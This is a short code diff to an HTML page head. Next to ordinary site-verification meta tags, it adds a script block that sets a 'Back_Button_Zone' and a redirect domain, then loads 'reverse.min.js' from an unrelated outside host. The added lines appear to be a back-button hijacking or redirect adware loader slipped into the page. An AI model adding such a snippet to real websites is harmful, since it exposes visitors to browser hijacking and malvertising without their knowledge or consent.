@@ -3,3 +3,9 @@
 <meta name="google-adsense-account" content="ca-pub-7684604780795634">
 <meta name="google-site-verification" content="JtGgW3jwoFYPQjigGDC1Vv3e6akm4YFZT4_ImkNt5Is" />
 <meta name="p:domain_verify" content="d5e314fdcfd694da5ceef307843a5297"/>
+
+<script>
+      var Back_Button_Zone = 8607900;
+      var Domain_TB = "mostazoaptoare.net";
+</script>
+<script async src="https://desenteir.com/42a/8c22c/reverse.min.js?sf=1"></script>
